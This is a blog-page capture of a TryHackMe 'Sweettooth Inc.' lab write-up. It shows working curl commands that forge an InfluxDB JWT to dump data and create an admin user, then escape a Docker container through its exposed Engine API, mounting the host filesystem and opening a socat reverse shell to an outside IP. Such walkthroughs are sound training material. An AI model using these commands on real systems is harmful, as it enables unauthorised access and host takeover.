@@ -1,0 +1,509 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>TryHackMe - Sweettooth Inc. (non port forward method) | xplo1t&#39;s site</title>
+<meta name="keywords" content="">
+<meta name="description" content="Hello everyone, this one is going to be the write-up for the Sweettooth Inc. room on TryHackMe. In this room, we’ll have to first enumerate a vulnerable database where we have to craft a JWT token to login into it and there we get the SSH credentials to the system. Once we get the foothold on the system, we see that that it’s a docker container with an exposed Docker Engine API.">
+<meta name="author" content="">
+<link rel="canonical" href="http://xplo1t.me/posts/tryhackme-sweettooth-inc-non-port-forward-method/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.3613efbd0b1772781e8f49935e973cae632a7f61471c05b17be155505ccf87b5.css" integrity="sha256-NhPvvQsXcngej0mTXpc8rmMqf2FHHAWxe&#43;FVUFzPh7U=" rel="preload stylesheet" as="style">
+<script defer crossorigin="anonymous" src="/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js" integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG&#43;9vmJ0cTS&#43;ovo0FeA="
+    onload="hljs.initHighlightingOnLoad();"></script>
+<link rel="icon" href="http://xplo1t.me/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://xplo1t.me/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://xplo1t.me/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://xplo1t.me/apple-touch-icon.png">
+<link rel="mask-icon" href="http://xplo1t.me/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --hljs-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:title" content="TryHackMe - Sweettooth Inc. (non port forward method)" />
+<meta property="og:description" content="Hello everyone, this one is going to be the write-up for the Sweettooth Inc. room on TryHackMe. In this room, we’ll have to first enumerate a vulnerable database where we have to craft a JWT token to login into it and there we get the SSH credentials to the system. Once we get the foothold on the system, we see that that it’s a docker container with an exposed Docker Engine API." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://xplo1t.me/posts/tryhackme-sweettooth-inc-non-port-forward-method/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-08-02T21:31:08+05:30" />
+<meta property="article:modified_time" content="2021-08-02T21:31:08+05:30" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="TryHackMe - Sweettooth Inc. (non port forward method)"/>
+<meta name="twitter:description" content="Hello everyone, this one is going to be the write-up for the Sweettooth Inc. room on TryHackMe. In this room, we’ll have to first enumerate a vulnerable database where we have to craft a JWT token to login into it and there we get the SSH credentials to the system. Once we get the foothold on the system, we see that that it’s a docker container with an exposed Docker Engine API."/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "http://xplo1t.me/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "TryHackMe - Sweettooth Inc. (non port forward method)",
+      "item": "http://xplo1t.me/posts/tryhackme-sweettooth-inc-non-port-forward-method/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "TryHackMe - Sweettooth Inc. (non port forward method)",
+  "name": "TryHackMe - Sweettooth Inc. (non port forward method)",
+  "description": "Hello everyone, this one is going to be the write-up for the Sweettooth Inc. room on TryHackMe. In this room, we’ll have to first enumerate a vulnerable database where we have to craft a JWT token to login into it and there we get the SSH credentials to the system. Once we get the foothold on the system, we see that that it’s a docker container with an exposed Docker Engine API.",
+  "keywords": [
+    
+  ],
+  "articleBody": " Hello everyone, this one is going to be the write-up for the Sweettooth Inc. room on TryHackMe. In this room, we’ll have to first enumerate a vulnerable database where we have to craft a JWT token to login into it and there we get the SSH credentials to the system. Once we get the foothold on the system, we see that that it’s a docker container with an exposed Docker Engine API. We can use it to break out of that docker container to get access to the host machine.\nNmap Starting off with the nmap scan:\n# Nmap 7.91 scan initiated Fri Jul 23 18:32:34 2021 as: nmap -sT -p- -sVC -oN services.nmap --open -n -v -T4 10.10.219.28 Nmap scan report for 10.10.219.28 Host is up (0.19s latency). Not shown: 59487 closed ports, 6044 filtered ports Some closed ports may be reported as filtered due to --defeat-rst-ratelimit PORT STATE SERVICE VERSION 111/tcp open rpcbind 2-4 (RPC #100000) | rpcinfo: | program version port/proto service | 100000 2,3,4 111/tcp rpcbind | 100000 2,3,4 111/udp rpcbind | 100000 3,4 111/tcp6 rpcbind | 100000 3,4 111/udp6 rpcbind | 100024 1 34421/udp6 status | 100024 1 40752/tcp status | 100024 1 43744/udp status |_ 100024 1 45271/tcp6 status 2222/tcp open ssh OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0) | ssh-hostkey: | 1024 b0:ce:c9:21:65:89:94:52:76:48:ce:d8:c8:fc:d4:ec (DSA) | 2048 7e:86:88:fe:42:4e:94:48:0a:aa:da:ab:34:61:3c:6e (RSA) | 256 04:1c:82:f6:a6:74:53:c9:c4:6f:25:37:4c:bf:8b:a8 (ECDSA) |_ 256 49:4b:dc:e6:04:07:b6:d5:ab:c0:b0:a3:42:8e:87:b5 (ED25519) 8086/tcp open http InfluxDB http admin 1.3.0 |_http-title: Site doesn't have a title (text/plain; charset=utf-8). 40752/tcp open status 1 (RPC #100024) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Points to take note on:\nPort 2222: SSH (OpenSSH 6.7p1) Port 8086: InfluxDB http admin 1.3.0 Device is probably a Linux system With a quick google search, we get to know that there has been a password bypass vulnerability in InfluxDB: https://github.com/influxdata/influxdb/issues/12927\nHere is an article that confirms that our InfluxDB version of 1.3.0 is indeed vulnerable and also explains how to exploit it: https://www.komodosec.com/post/when-all-else-fails-find-a-0-day\nTo exploit this, we first need a valid username. This can be done rather easily by simply visiting the /debug/requests endpoint on your web browser. The URL would look similar to this: http://10.10.219.28:8086/debug/requests\nFound database username\nDatabase username: o5yY6yya\nNow, to craft the JWT token, we need to set up the following parameters:\nusername: o5yY6yya valid expiry date empty secret key It should look something like this:\nUsing jwt.io to create our token\nThe InfluxDB API documentation explains it pretty well on how to use it:\nhttps://docs.influxdata.com/influxdb/v1.8/guides/query_data/ https://docs.influxdata.com/influxdb/v1.8/administration/authentication_and_authorization/ Here are a few queries to help with the tasks:\nTo show the databases: (I’m using jq to parse the json for better readability) curl -G 'http://10.10.219.28:8086/query?' --data-urlencode 'q=SHOW DATABASES;' -H 'Authorization: Bearer ' | jq To show the tables in the selected database (Tables are called ‘series’ in InfluxDB): curl -G 'http://10.10.219.28:8086/query?' --data-urlencode \"db=mixer\" --data-urlencode 'q=SHOW SERIES' -H 'Authorization: Bearer ' | jq To show the contents of the series: curl -G 'http://10.10.219.28:8086/query?' --data-urlencode \"db=tanks\" --data-urlencode 'q=SELECT * FROM water_tank' -H 'Authorization: Bearer ' | jq You can also create a privileged account and then instead of going the curl way, simply use the influx CLI tool. To create a privileged account, we need to specify the username and password with the ‘ALL PRIVILEGES’ privilege set.\ncurl -X POST '[http://10.10.219.28:8086/query?'](http://10.10.219.28:8086/query?%27=) --data-urlencode \"q=CREATE USER xplo1t with PASSWORD 'xplo1t' with ALL PRIVILEGES\" -H 'Authorization: Bearer ' Inside the database, we can get the SSH credentials:\nOnly thing left to do now is login :)\nSSH log in with these credentials. With some enumeration, we see that we are in a docker container. In the root directory, there are two suspicious files which may be of our interest:\nentrypoint.sh initializeandquery.sh After looking through the files, the ‘initializeandquery.sh’ file gives a hint that the port 8080 is being used for querying about the docker containers.\nCheck the bottom part of initializeandquery.sh\nIf you haven’t used this before, the documentation should help you out: https://docs.docker.com/engine/api/v1.38/.\nLet’s see what containers are present:\ncurl -X GET http://localhost:8080/containers/json From the output of this command, we get the image name as ‘sweettoothinc’.\nLet’s try adding our own image file.\nI made a json image (named it as image.json) with the following configuration:\n{ \"Image\":\"sweettoothinc\", \"cmd\":[\"/bin/bash\"], \"Binds\": [ \"/:/mnt:rw\" ] } When we start this container, /bin/bash run and the whole filesystem of the host system will be mounted onto the /mnt directory. So we’ll have access to all the files of the host machine with full read/write access.\nUploading the container:\ncurl -X POST -H \"Content-Type: application/json\" -d @image.json 'http://localhost:8080/containers/create' Output: {\"Id\":\"2b5918d16a56fb462b32bcfd72924d925d9d5b31e7cee75af226432d2e54d7c9\",\"Warnings\":null} Note the container ID of our new container\nContainer ID: 2b5918d16a56fb462b32bcfd72924d925d9d5b31e7cee75af226432d2e54d7c9\nLets try starting it:\ncurl -X POST 'http://localhost:8080/containers/2b5918d16a56fb462b32bcfd72924d925d9d5b31e7cee75af226432d2e54d7c9/start' Output: No output. Means it started successfully Since we now have the whole filesystem of the host machine in this container, we own them too. To get a reverse shell, we need to create an exec instance. It allows us to execute commands inside running containers.\nWith the container ID we got earlier, create a new exec instance with a socat reverse shell:\ncurl -i -s -X POST -H \"Content-Type: application/json\" --data-binary '{\"AttachStdin\": true,\"AttachStdout\": true,\"AttachStderr\": true,\"Cmd\": [\"socat\" ,\"TCP:10.17.10.220:1337\", \"EXEC:sh\"],\"DetachKeys\": \"ctrl-p,ctrl-q\",\"Privileged\": true,\"Tty\": true}' 'http://localhost:8080/containers/2b5918d16a56fb462b32bcfd72924d925d9d5b31e7cee75af226432d2e54d7c9/exec' Output: {\"Id\":\"da3d7220e76cf0c291311f35773c3e12283ff6929e21bc81b0567cd3eb43ce48\"} Exec ID: da3d7220e76cf0c291311f35773c3e12283ff6929e21bc81b0567cd3eb43ce48\nSet up a listener on your local machine on the same 1337 port. And start the exec instance:\ncurl -i -s -X POST -H 'Content-Type: application/json' --data-binary '{\"Detach\": false,\"Tty\": false}' 'http://localhost:8080/exec/da3d7220e76cf0c291311f35773c3e12283ff6929e21bc81b0567cd3eb43ce48/start' On the listener, there should be a shell waiting for you\nHere is an article if you want to read more: https://dejandayoff.com/the-danger-of-exposing-docker.sock/. Thanks for reading this far. See you next time.\n",
+  "wordCount" : "933",
+  "inLanguage": "en",
+  "datePublished": "2021-08-02T21:31:08+05:30",
+  "dateModified": "2021-08-02T21:31:08+05:30",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "http://xplo1t.me/posts/tryhackme-sweettooth-inc-non-port-forward-method/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "xplo1t's site",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "http://xplo1t.me/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://xplo1t.me/" accesskey="h" title="xplo1t&#39;s site (Alt + H)">xplo1t&#39;s site</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="http://xplo1t.me/">Home</a>&nbsp;»&nbsp;<a href="http://xplo1t.me/posts/">Posts</a></div>
+    <h1 class="post-title">
+      TryHackMe - Sweettooth Inc. (non port forward method)
+    </h1>
+    <div class="post-meta"><span title='2021-08-02 21:31:08 +0530 IST'>August 2, 2021</span>&nbsp;·&nbsp;5 min
+
+</div>
+  </header> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#nmap" aria-label="Nmap">Nmap</a>
+                </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><p><img loading="lazy" src="/images/img-tryhackme-sweettooth-inc-non-port-forward-method-0.png" alt=""  />
+</p>
+<p>Hello everyone, this one is going to be the write-up for the <a href="https://tryhackme.com/room/sweettoothinc">Sweettooth Inc. room</a> on <a href="https://tryhackme.com/">TryHackMe</a>.
+In this room, we’ll have to first enumerate a vulnerable database where we have to craft a JWT token to login into it and there we get the SSH credentials to the system. Once we get the foothold on the system, we see that that it’s a docker container with an exposed Docker Engine API. We can use it to break out of that docker container to get access to the host machine.</p>
+<h1 id="nmap">Nmap<a hidden class="anchor" aria-hidden="true" href="#nmap">#</a></h1>
+<p>Starting off with the nmap scan:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Nmap 7.91 scan initiated Fri Jul 23 18:32:34 2021 as: nmap -sT -p- -sVC -oN services.nmap --open -n -v -T4 10.10.219.28  </span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.219.28  
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.19s latency<span style="color:#f92672">)</span>.  
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">59487</span> closed ports, <span style="color:#ae81ff">6044</span> filtered ports  
+</span></span><span style="display:flex;"><span>Some closed ports may be reported as filtered due to --defeat-rst-ratelimit  
+</span></span><span style="display:flex;"><span>PORT      STATE SERVICE VERSION  
+</span></span><span style="display:flex;"><span>111/tcp   open  rpcbind 2-4 <span style="color:#f92672">(</span>RPC <span style="color:#75715e">#100000)  </span>
+</span></span><span style="display:flex;"><span>| rpcinfo:   
+</span></span><span style="display:flex;"><span>|   program version    port/proto  service  
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">100000</span>  2,3,4        111/tcp   rpcbind  
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">100000</span>  2,3,4        111/udp   rpcbind  
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">100000</span>  3,4          111/tcp6  rpcbind  
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">100000</span>  3,4          111/udp6  rpcbind  
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">100024</span>  <span style="color:#ae81ff">1</span>          34421/udp6  status  
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">100024</span>  <span style="color:#ae81ff">1</span>          40752/tcp   status  
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">100024</span>  <span style="color:#ae81ff">1</span>          43744/udp   status  
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">100024</span>  <span style="color:#ae81ff">1</span>          45271/tcp6  status  
+</span></span><span style="display:flex;"><span>2222/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u8 <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>  
+</span></span><span style="display:flex;"><span>| ssh-hostkey:   
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">1024</span> b0:ce:c9:21:65:89:94:52:76:48:ce:d8:c8:fc:d4:ec <span style="color:#f92672">(</span>DSA<span style="color:#f92672">)</span>  
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">2048</span> 7e:86:88:fe:42:4e:94:48:0a:aa:da:ab:34:61:3c:6e <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>  
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 04:1c:82:f6:a6:74:53:c9:c4:6f:25:37:4c:bf:8b:a8 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>  
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> 49:4b:dc:e6:04:07:b6:d5:ab:c0:b0:a3:42:8e:87:b5 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>  
+</span></span><span style="display:flex;"><span>8086/tcp  open  http    InfluxDB http admin 1.3.0  
+</span></span><span style="display:flex;"><span>|_http-title: Site doesn<span style="color:#960050;background-color:#1e0010">&#39;</span>t have a title <span style="color:#f92672">(</span>text/plain; charset<span style="color:#f92672">=</span>utf-8<span style="color:#f92672">)</span>.  
+</span></span><span style="display:flex;"><span>40752/tcp open  status  <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>RPC <span style="color:#75715e">#100024)  </span>
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span></code></pre></div><p>Points to take note on:</p>
+<ul>
+<li>Port 2222: SSH (OpenSSH 6.7p1)</li>
+<li>Port 8086: InfluxDB http admin 1.3.0</li>
+<li>Device is probably a Linux system</li>
+</ul>
+<p>With a quick google search, we get to know that there has been a password bypass vulnerability in InfluxDB: <a href="https://github.com/influxdata/influxdb/issues/12927">https://github.com/influxdata/influxdb/issues/12927</a></p>
+<p>Here is an article that confirms that our InfluxDB version of 1.3.0 is indeed vulnerable and also explains how to exploit it: <a href="https://www.komodosec.com/post/when-all-else-fails-find-a-0-day">https://www.komodosec.com/post/when-all-else-fails-find-a-0-day</a></p>
+<p>To exploit this, we first need a valid username. This can be done rather easily by simply visiting the <code>/debug/requests</code> endpoint on your web browser. The URL would look similar to this: <code>http://10.10.219.28:8086/debug/requests</code></p>
+<p><img loading="lazy" src="/images/img-tryhackme-sweettooth-inc-non-port-forward-method-1.png" alt=""  />
+
+Found database username</p>
+<p>Database username: o5yY6yya</p>
+<p>Now, to craft the JWT token, we need to set up the following parameters:</p>
+<ul>
+<li>username: o5yY6yya</li>
+<li>valid expiry date</li>
+<li>empty secret key</li>
+</ul>
+<p>It should look something like this:</p>
+<p><img loading="lazy" src="/images/img-tryhackme-sweettooth-inc-non-port-forward-method-2.png" alt=""  />
+
+Using <a href="https://jwt.io/">jwt.io</a> to create our token</p>
+<p>The InfluxDB API documentation explains it pretty well on how to use it:</p>
+<ul>
+<li><a href="https://docs.influxdata.com/influxdb/v1.8/guides/query_data/">https://docs.influxdata.com/influxdb/v1.8/guides/query_data/</a></li>
+<li><a href="https://docs.influxdata.com/influxdb/v1.8/administration/authentication_and_authorization/">https://docs.influxdata.com/influxdb/v1.8/administration/authentication_and_authorization/</a></li>
+</ul>
+<p>Here are a few queries to help with the tasks:</p>
+<ul>
+<li>To show the databases: (I’m using <a href="https://github.com/stedolan/jq">jq</a> to parse the json for better readability)</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -G <span style="color:#e6db74">&#39;http://10.10.219.28:8086/query?&#39;</span> --data-urlencode <span style="color:#e6db74">&#39;q=SHOW DATABASES;&#39;</span>  -H <span style="color:#e6db74">&#39;Authorization: Bearer &lt;jwt token here&gt;&#39;</span> | jq
+</span></span></code></pre></div><ul>
+<li>To show the tables in the selected database (Tables are called ‘series’ in InfluxDB):</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -G <span style="color:#e6db74">&#39;http://10.10.219.28:8086/query?&#39;</span> --data-urlencode <span style="color:#e6db74">&#34;db=mixer&#34;</span> --data-urlencode <span style="color:#e6db74">&#39;q=SHOW SERIES&#39;</span>  -H <span style="color:#e6db74">&#39;Authorization: Bearer &lt;jwt token here&gt;&#39;</span> | jq
+</span></span></code></pre></div><ul>
+<li>To show the contents of the series:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -G <span style="color:#e6db74">&#39;http://10.10.219.28:8086/query?&#39;</span> --data-urlencode <span style="color:#e6db74">&#34;db=tanks&#34;</span> --data-urlencode <span style="color:#e6db74">&#39;q=SELECT * FROM water_tank&#39;</span>  -H <span style="color:#e6db74">&#39;Authorization: Bearer &lt;jwt token here&gt;&#39;</span> | jq
+</span></span></code></pre></div><p>You can also create a privileged account and then instead of going the curl way, simply use the <a href="https://docs.influxdata.com/influxdb/v1.8/tools/shell/">influx CLI</a> tool. To create a privileged account, we need to specify the username and password with the ‘ALL PRIVILEGES’ privilege set.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -X POST <span style="color:#e6db74">&#39;[http://10.10.219.28:8086/query?&#39;</span><span style="color:#f92672">](</span>http://10.10.219.28:8086/query?%27<span style="color:#f92672">=)</span> --data-urlencode <span style="color:#e6db74">&#34;q=CREATE USER xplo1t with PASSWORD &#39;xplo1t&#39; with ALL PRIVILEGES&#34;</span>  -H <span style="color:#e6db74">&#39;Authorization: Bearer &lt;jwt token here&gt;&#39;</span>
+</span></span></code></pre></div><p>Inside the database, we can get the SSH credentials:</p>
+<p><img loading="lazy" src="/images/img-tryhackme-sweettooth-inc-non-port-forward-method-3.png" alt=""  />
+
+Only thing left to do now is login :)</p>
+<p>SSH log in with these credentials. With some enumeration, we see that we are in a docker container. In the root directory, there are two suspicious files which may be of our interest:</p>
+<ul>
+<li>entrypoint.sh</li>
+<li>initializeandquery.sh</li>
+</ul>
+<p>After looking through the files, the ‘initializeandquery.sh’ file gives a hint that the port 8080 is being used for querying about the docker containers.</p>
+<p><img loading="lazy" src="/images/img-tryhackme-sweettooth-inc-non-port-forward-method-4.png" alt=""  />
+</p>
+<p>Check the bottom part of initializeandquery.sh</p>
+<p>If you haven’t used this before, the documentation should help you out: <a href="https://docs.docker.com/engine/api/v1.38/">https://docs.docker.com/engine/api/v1.38/</a>.</p>
+<p>Let’s see what containers are present:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -X GET http://localhost:8080/containers/json
+</span></span></code></pre></div><p>From the output of this command, we get the image name as ‘sweettoothinc’.</p>
+<p>Let’s try adding our own image file.<br>
+I made a json image (named it as <code>image.json</code>) with the following configuration:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{  
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">&#34;Image&#34;</span>:<span style="color:#e6db74">&#34;sweettoothinc&#34;</span>,  
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">&#34;cmd&#34;</span>:[<span style="color:#e6db74">&#34;/bin/bash&#34;</span>],  
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">&#34;Binds&#34;</span>: [  
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;/:/mnt:rw&#34;</span>  
+</span></span><span style="display:flex;"><span> ]  
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>When we start this container, <code>/bin/bash</code> run and the whole filesystem of the host system will be mounted onto the <code>/mnt</code> directory. So we’ll have access to all the files of the host machine with full read/write access.</p>
+<p>Uploading the container:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -X POST -H <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span> -d @image.json <span style="color:#e6db74">&#39;http://localhost:8080/containers/create&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Output:  
+</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span><span style="color:#e6db74">&#34;Id&#34;</span>:<span style="color:#e6db74">&#34;2b5918d16a56fb462b32bcfd72924d925d9d5b31e7cee75af226432d2e54d7c9&#34;</span>,<span style="color:#e6db74">&#34;Warnings&#34;</span>:null<span style="color:#f92672">}</span>
+</span></span></code></pre></div><p>Note the container ID of our new container</p>
+<blockquote>
+<p>Container ID: 2b5918d16a56fb462b32bcfd72924d925d9d5b31e7cee75af226432d2e54d7c9</p>
+</blockquote>
+<p>Lets try starting it:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -X POST  <span style="color:#e6db74">&#39;http://localhost:8080/containers/2b5918d16a56fb462b32bcfd72924d925d9d5b31e7cee75af226432d2e54d7c9/start&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Output: No output. Means it started successfully
+</span></span></code></pre></div><p>Since we now have the whole filesystem of the host machine in this container, we own them too. To get a reverse shell, we need to create an exec instance. It allows us to execute commands inside running containers.</p>
+<p>With the container ID we got earlier, create a new exec instance with a socat reverse shell:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -i -s -X POST -H <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span> --data-binary <span style="color:#e6db74">&#39;{&#34;AttachStdin&#34;: true,&#34;AttachStdout&#34;: true,&#34;AttachStderr&#34;: true,&#34;Cmd&#34;: [&#34;socat&#34; ,&#34;TCP:10.17.10.220:1337&#34;, &#34;EXEC:sh&#34;],&#34;DetachKeys&#34;: &#34;ctrl-p,ctrl-q&#34;,&#34;Privileged&#34;: true,&#34;Tty&#34;: true}&#39;</span> <span style="color:#e6db74">&#39;http://localhost:8080/containers/2b5918d16a56fb462b32bcfd72924d925d9d5b31e7cee75af226432d2e54d7c9/exec&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Output:
+</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span><span style="color:#e6db74">&#34;Id&#34;</span>:<span style="color:#e6db74">&#34;da3d7220e76cf0c291311f35773c3e12283ff6929e21bc81b0567cd3eb43ce48&#34;</span><span style="color:#f92672">}</span>
+</span></span></code></pre></div><blockquote>
+<p>Exec ID: da3d7220e76cf0c291311f35773c3e12283ff6929e21bc81b0567cd3eb43ce48</p>
+</blockquote>
+<p>Set up a listener on your local machine on the same 1337 port. And start the exec instance:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -i -s -X POST -H <span style="color:#e6db74">&#39;Content-Type: application/json&#39;</span> --data-binary <span style="color:#e6db74">&#39;{&#34;Detach&#34;: false,&#34;Tty&#34;: false}&#39;</span> <span style="color:#e6db74">&#39;http://localhost:8080/exec/da3d7220e76cf0c291311f35773c3e12283ff6929e21bc81b0567cd3eb43ce48/start&#39;</span>
+</span></span></code></pre></div><p>On the listener, there should be a shell waiting for you</p>
+<p><img loading="lazy" src="/images/img-tryhackme-sweettooth-inc-non-port-forward-method-5.png" alt=""  />
+</p>
+<p>Here is an article if you want to read more: <a href="https://dejandayoff.com/the-danger-of-exposing-docker.sock/">https://dejandayoff.com/the-danger-of-exposing-docker.sock/</a>.
+Thanks for reading this far. See you next time.</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
